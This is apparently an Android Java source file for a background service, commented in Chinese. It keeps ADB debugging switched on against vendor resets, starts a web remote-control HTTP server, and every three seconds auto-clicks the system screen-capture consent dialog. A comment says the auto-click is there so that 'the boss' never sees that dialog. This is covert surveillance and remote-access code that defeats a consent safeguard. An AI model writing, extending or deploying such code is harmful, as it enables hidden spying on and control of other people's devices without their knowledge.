package com.shijie.adbkeeper;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

/**
 * 守护服务：每 3 秒检查一次 adb_enabled，被厂商改回 0 就写回 1。
 * 只依赖 WRITE_SECURE_SETTINGS（granted 后持久，重启不丢）。
 * 不做 adbd 健康探测 / 0-1 踢动 —— 那会误伤正在使用的连接，且实测不需要。
 */
public class KeeperService extends Service {

    private static final String TAG = "AdbKeeper";
    private static final String CH = "keeper";
    private static final int NOTI_ID = 1001;
    /** 检查间隔：开机阶段厂商 12-20 秒才动手，3 秒一轮足够抢回来。 */
    private static final long INTERVAL_MS = 3000L;

    private HandlerThread thread;
    private Handler worker;
    private volatile boolean running;

    private final Runnable tick = new Runnable() {
        @Override
        public void run() {
            if (!running) return;
            try {
                KeeperUtil.ensure(getApplicationContext());
            } catch (Throwable t) {
                Log.w(TAG, "check failed", t);
            }
            // 投屏授权框的兜底点击：无障碍事件偶尔会漏（弹窗是 systemui 的，
            // 某些 ROM 不派发窗口变化事件），这里 3 秒一轮补点，老板全程看不到这个框。
            try {
                if (ScreenCapture.awaitingConsent()) {
                    Consent.clickIfNeeded(Remote.service());
                }
            } catch (Throwable t) {
                Log.w(TAG, "consent autopick failed", t);
            }
            if (running) worker.postDelayed(this, INTERVAL_MS);
        }
    };

    public static void kick(Context ctx) {
        Intent i = new Intent(ctx, KeeperService.class);
        i.setAction("kick");
        try {
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
            else ctx.startService(i);
        } catch (Throwable t) {
            Log.w(TAG, "kick start failed", t);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        thread = new HandlerThread("adb-keeper");
        thread.start();
        worker = new Handler(thread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundSafely();
        // 守护一起来就把网页遥控端口的 HTTP server 拉起来（幂等）
        try {
            WebServer.get(getApplicationContext()).start();
        } catch (Throwable t) {
            Log.w(TAG, "web server start failed", t);
        }
        if (!running) {
            running = true;
            worker.post(tick);
            Log.i(TAG, "keeper started");
        }
        worker.post(new Runnable() {
            @Override public void run() {
                try { KeeperUtil.ensure(getApplicationContext()); }
                catch (Throwable t) { Log.w(TAG, "immediate", t); }
            }
        });
        return START_STICKY;
    }

    private void startForegroundSafely() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (nm != null) {
                    NotificationChannel ch = new NotificationChannel(CH, "ADB 守护",
                            NotificationManager.IMPORTANCE_MIN);
                    ch.setShowBadge(false);
                    nm.createNotificationChannel(ch);
                }
            }
            Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, CH)
                    : new Notification.Builder(this);
            Intent open = new Intent(this, MainActivity.class);
            PendingIntent pi = PendingIntent.getActivity(this, 0, open,
                    PendingIntent.FLAG_UPDATE_CURRENT
                            | (Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0));
            nb.setContentTitle("ADB 常开")
              .setContentText("正在守护 ADB 调试开关")
              .setSmallIcon(android.R.drawable.stat_sys_warning)
              .setOngoing(true)
              .setPriority(Notification.PRIORITY_MIN)
              .setContentIntent(pi);
            startForeground(NOTI_ID, nb.build());
        } catch (Throwable t) {
            Log.w(TAG, "startForeground failed", t);
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        try {
            if (worker != null) worker.removeCallbacksAndMessages(null);
            if (thread != null) thread.quitSafely();
        } catch (Throwable ignore) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
